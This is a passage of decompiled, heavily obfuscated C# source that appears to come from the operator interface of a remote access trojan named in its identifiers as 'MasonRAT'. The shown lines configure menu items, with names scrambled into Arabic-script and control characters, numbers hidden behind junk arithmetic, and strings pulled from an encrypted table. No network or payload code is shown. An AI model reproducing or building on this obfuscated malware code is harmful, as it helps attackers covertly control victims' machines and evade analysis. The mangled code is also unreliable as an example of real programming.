    this.\u2694️MasonRAT\u270Cڅ\u0608ۡـۧۡ\u060Eـ\u0608ئ\u0608\u060Aدﻋ\u060Bڙ.Size = new Size((-202947588 - 1949816137 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) - ((845920877 > 361043460 ? 1873749359 : -1796634818) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 | -1455292690 - 1444590187 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1), 28);
    this.\u2694️MasonRAT\u270Cڅ\u0608ۡـۧۡ\u060Eـ\u0608ئ\u0608\u060Aدﻋ\u060Bڙ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 214);
    this.\u2694️MasonRAT\u270Cټ\u060Aــ\u0609\u0608\u060Eٸ\u060A\u060Cـۧءﻻ\u0608ڙڙ\u060Aڙ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cټ\u060Aــ\u0609\u0608\u060Eٸ\u060A\u060Cـۧءﻻ\u0608ڙڙ\u060Aڙ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 215));
    this.\u2694️MasonRAT\u270Cټ\u060Aــ\u0609\u0608\u060Eٸ\u060A\u060Cـۧءﻻ\u0608ڙڙ\u060Aڙ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 216);
    this.\u2694️MasonRAT\u270Cټ\u060Aــ\u0609\u0608\u060Eٸ\u060A\u060Cـۧءﻻ\u0608ڙڙ\u060Aڙ.Size = new Size(((-1927206219 ^ 162570175 << 2086815944) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + -(-764799655 - ~1800699799 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), 28);
    this.\u2694️MasonRAT\u270Cټ\u060Aــ\u0609\u0608\u060Eٸ\u060A\u060Cـۧءﻻ\u0608ڙڙ\u060Aڙ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 217);
    ToolStripItemCollection dropDownItems2 = this.\u2694️MasonRAT\u270Cؤ\u060Fـ\u060A\u0608ح\u0020ڇـ\u0608ـۜٺـڙگى\u0609\u060F.DropDownItems;
    ToolStripItem[] toolStripItems3 = new ToolStripItem[((1058937996 ^ 473951036 >> 423388389) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) - (737890755 + 233049999 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 | -1529329151 - (1960641828 | 1551983150) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0];
    toolStripItems3[0] = (ToolStripItem) this.\u2694️MasonRAT\u270Cـــ\u060Aـۛـ\u0609ٺــ;
    toolStripItems3[1] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u060A\u0608\u060Fٻ̍\u060Aـح\u0608ﻼڟ\u060B;
    dropDownItems2.AddRange(toolStripItems3);
    this.\u2694️MasonRAT\u270Cؤ\u060Fـ\u060A\u0608ح\u0020ڇـ\u0608ـۜٺـڙگى\u0609\u060F.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cؤ\u060Fـ\u060A\u0608ح\u0020ڇـ\u0608ـۜٺـڙگى\u0609\u060F.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 218));
    this.\u2694️MasonRAT\u270Cؤ\u060Fـ\u060A\u0608ح\u0020ڇـ\u0608ـۜٺـڙگى\u0609\u060F.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 219);
    this.\u2694️MasonRAT\u270Cؤ\u060Fـ\u060A\u0608ح\u0020ڇـ\u0608ـۜٺـڙگى\u0609\u060F.Size = new Size((830002680 ^ ~904203346) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 + ((-795833551 ^ -737324706) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) % (1884195483 - (259296192 << 2099603694) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0, 28);
    this.\u2694️MasonRAT\u270Cؤ\u060Fـ\u060A\u0608ح\u0020ڇـ\u0608ـۜٺـڙگى\u0609\u060F.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 220);
    this.\u2694️MasonRAT\u270Cـــ\u060Aـۛـ\u0609ٺــ.BackColor = Color.FromArgb((143885032 > 1329357399 ? -1720323121 : -1290242341) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 + ((1884307965 ^ 1924439295 % 1834007847) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 << 1703514301 + 1528937499 % 1508595186 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0, (191027667 - (1360635852 << 534931554) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + ((1754907385 > 667857410 ? 956548471 : 1275397961) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0), -1956856853 - 1062861167 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 - ((1668592247 ^ 796291109 % 1586151200) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1));
    this.\u2694️MasonRAT\u270Cـــ\u060Aـۛـ\u0609ٺــ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cـــ\u060Aـۛـ\u0609ٺــ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 221));
    this.\u2694️MasonRAT\u270Cـــ\u060Aـۛـ\u0609ٺــ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 222);
    this.\u2694️MasonRAT\u270Cـــ\u060Aـۛـ\u0609ٺــ.Size = new Size((-440929557 - 740026982 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + ((795951889 > 648841504 ? 1180956776 : 1574609034) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0, 28);
    this.\u2694️MasonRAT\u270Cـــ\u060Aـۛـ\u0609ٺــ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 223);
    this.\u2694️MasonRAT\u270C\u060A\u0608\u060Fٻ̍\u060Aـح\u0608ﻼڟ\u060B.BackColor = Color.FromArgb((-842214778 - -842214914 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 ^ 919768876 + ~302321989 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 >> (437712021 + 1328287201 % 2080478940 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0, ((2011710981 > 1059948322 ? 1480522640 : 1974030186) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 > (-1096287865 ^ ~341211988) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 ? 2050421264 + -2050421238 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 : (1988925612 >> 1548026639) - 60663 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1, (-1556114542 - (531960057 << 615762091) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + (2011441286 - (1280500019 >> 875544625) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) % (-828682876 - (137982095 | 1406603066) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1));
    this.\u2694️MasonRAT\u270C\u060A\u0608\u060Fٻ̍\u060Aـح\u0608ﻼڟ\u060B.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270C\u060A\u0608\u060Fٻ̍\u060Aـح\u0608ﻼڟ\u060B.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 224 /*0xE0*/));
    this.\u2694️MasonRAT\u270C\u060A\u0608\u060Fٻ̍\u060Aـح\u0608ﻼڟ\u060B.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 225);
    this.\u2694️MasonRAT\u270C\u060A\u0608\u060Fٻ̍\u060Aـح\u0608ﻼڟ\u060B.Size = new Size((186155602 - 252848117 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0 ^ -(2023478434 - 1956786002 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0, 28);
    this.\u2694️MasonRAT\u270C\u060A\u0608\u060Fٻ̍\u060Aـح\u0608ﻼڟ\u060B.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 226);
    ToolStripItemCollection dropDownItems3 = this.\u2694️MasonRAT\u270C\u060A\u060Aـۜــٺ\u0609ٺـ\u060Fة.DropDownItems;
    ToolStripItem[] toolStripItems4 = new ToolStripItem[(-1597769817 ^ 1458450487 >> 149312589) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 + ((1237887491 > 1891325612 ? 1433986785 : 1075490089) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 | 1596362653 - (168957332 >> 535090029) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)];
    toolStripItems4[0] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u0020\u0608\u060Fۙﯧژــْـ\u060Dڦ\u0608ب\u060Dٽ\u060F;
    toolStripItems4[1] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u060Dٸڕ\u0609ۡ\u0608ـح\u0609طڙ\u060Fۙڙ\u060Eټـ\u060Aـ;
    toolStripItems4[(914194727 - 914156832 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) - ((1671364035 > 411617280 ? 620849033 : 827798710) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 >> (851985981 - 680224239 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)] = (ToolStripItem) this.\u2694️MasonRAT\u270Cڙ\u060Bـ؁ــ\u060F\u060Aح\u060A\u0608̍\u060A;
    dropDownItems3.AddRange(toolStripItems4);
    this.\u2694️MasonRAT\u270C\u060A\u060Aـۜــٺ\u0609ٺـ\u060Fة.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270C\u060A\u060Aـۜــٺ\u0609ٺـ\u060Fة.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 227));
    this.\u2694️MasonRAT\u270C\u060A\u060Aـۜــٺ\u0609ٺـ\u060Fة.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 228);
    this.\u2694️MasonRAT\u270C\u060A\u060Aـۜــٺ\u0609ٺـ\u060Fة.Size = new Size(((-2062688411 ^ -1570031674) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 > ((1085261303 > 2010495856 ? 1445851840 : 1084388880) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) ? (262 ^ 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 : (411016057 > 1458159518 ? 261 : 196) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0), 28);
    this.\u2694️MasonRAT\u270C\u060A\u060Aـۜــٺ\u0609ٺـ\u060Fة.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 229);
    this.\u2694️MasonRAT\u270C\u0020\u0608\u060Fۙﯧژــْـ\u060Dڦ\u0608ب\u060Dٽ\u060F.BackColor = Color.FromArgb(((-1239699198 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) - ~((-14397684 ^ 36214488 << 1229447987) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0, (1230121158 % 411177318 - 407765986 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) - ((1553321668 > 796056296 ? 2143039161 : -1437581748) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 >> (2137231158 + (528323508 << 1483179748) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0), (80123 - (328020886 >> 1607252876) + 